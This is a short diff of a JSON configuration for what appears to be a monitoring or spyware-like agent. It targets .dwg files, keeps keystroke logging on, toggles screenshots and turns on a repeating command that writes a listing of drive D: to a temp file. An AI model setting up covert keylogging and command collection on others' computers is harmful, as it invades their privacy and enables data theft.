@@ -15,9 +15,9 @@
   "_certainFileTypeInRootFolder":"dwg",
   "timeRepeatMinutes": 1,
   "reloadconfigFile": true,
-  "scrShot": true,
+  "_scrShot": true,
   "keyLog": true,
   "_pcCurrentLoc": true,
-  "_repeatCmdCommands": true,
+  "repeatCmdCommands": true,
   "cmdCommandsList": ["dir D:\\ /q >> \"C:\\Temp\\string.txt\""]
 }
